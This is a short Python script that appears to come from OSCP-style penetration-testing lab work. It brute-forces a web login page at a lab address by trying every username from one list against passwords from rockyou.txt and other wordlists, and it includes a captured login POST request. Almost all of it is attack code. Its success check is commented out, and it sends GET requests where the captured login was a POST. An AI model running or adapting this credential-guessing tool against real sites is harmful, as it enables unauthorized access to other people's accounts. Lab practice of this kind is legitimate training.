#!/usr/bin/python3

# Python script to read THINC users and passwords for webpage auth
'''
POST /flatfilelogin/login.php HTTP/1.1
Host: 10.11.1.223
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.11.1.223/flatfilelogin/login.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 31
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1

username=newuser&password=wampp
'''

import requests
from lxml.html import fromstring

proxies = {
    "http": "http://192.168.1.232:8080"
}

user_file = '/root/oscplab/thinc_users.list'
pass_files = [
            "/root/oscplab/thinc_passwords.list",
            "/usr/share/dirb/wordlists/common.txt",
            "/usr/share/wordlists/rockyou.txt"

]

for pass_file in pass_files:
    with open(user_file) as u:
        for line in u:
            lineu = line.rstrip()
            with open(pass_file) as p:
                    for line in p:
                        linep = line.rstrip()
                        payload = {'username' : lineu, 'password': linep}
                        print(payload)
                        r = requests.get("http://10.11.1.223/flatfilelogin/login.php", data=payload)
                        tree = fromstring(r.content)
                        page_title = tree.findtext('.//title')
#                        if page_title != 'Authentication Required!':
#                            print(lineu + ":" + linep + "is a valid username:password")




